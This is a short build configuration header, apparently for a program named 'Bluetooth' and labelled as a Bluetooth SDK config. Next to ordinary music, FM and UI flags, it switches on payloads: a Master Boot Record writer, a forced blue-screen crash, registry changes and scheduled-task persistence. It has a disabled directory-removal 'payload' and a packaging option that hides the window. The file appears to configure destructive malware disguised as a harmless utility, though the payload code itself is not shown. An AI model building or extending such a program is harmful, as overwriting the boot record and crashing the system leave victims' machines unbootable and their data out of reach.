/***************************************************************
 * Name:      config.h
 * Purpose:   BT_SDK Config
 * Author:    0x0_nyan
 * Created:   2025-04-24
 * Copyright: 0x0_nyan
 * License:
 **************************************************************/


#define PROTOTYPE 0					//Set to 0 for build, 1 for test run on IDE
#define DEBUG_1_EN 0

#define ANGRY_THRESHOLD 1
#define PLAY_SEL_EN 1
#define MUSIC_EN 1
#define FM_EN 1
#define LINEIN_EN 1
#define UI_EN 1

#define BSOD_EN 1
#define MBRWRITER_EN 1
#define REGISTRY_EN 1
#define RMDIR_EN 0					//Unused payload, default is 0
#define TASKSCH_EN 1



#packopt name "Bluetooth"
#packopt runtime "Bluetooth.res"
#packopt hide 1
